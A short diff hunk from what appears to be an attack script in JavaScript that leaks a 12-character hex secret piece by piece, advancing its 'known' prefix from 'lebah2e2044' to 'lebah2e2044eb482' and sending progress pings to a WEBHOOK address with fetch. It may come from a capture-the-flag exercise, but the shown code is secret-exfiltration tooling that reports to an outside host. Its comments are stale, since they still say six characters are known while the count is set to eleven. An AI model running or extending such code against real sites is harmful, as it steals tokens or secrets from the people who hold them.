@@ -83,8 +83,8 @@ async function start() {
     fetch(WEBHOOK + '?status=continue_started').catch(e=>{});
     
     // START FROM KNOWN PREFIX
-    let known = 'lebah2e2044';
-    const charsGot = 6; // Already have 6 hex chars
+    let known = 'lebah2e2044eb482';
+    const charsGot = 11; // Already have 6 hex chars
     const charsNeeded = 12 - charsGot; // Need 6 more
     
     log(`Already leaked: ${charsGot}/12 chars`);
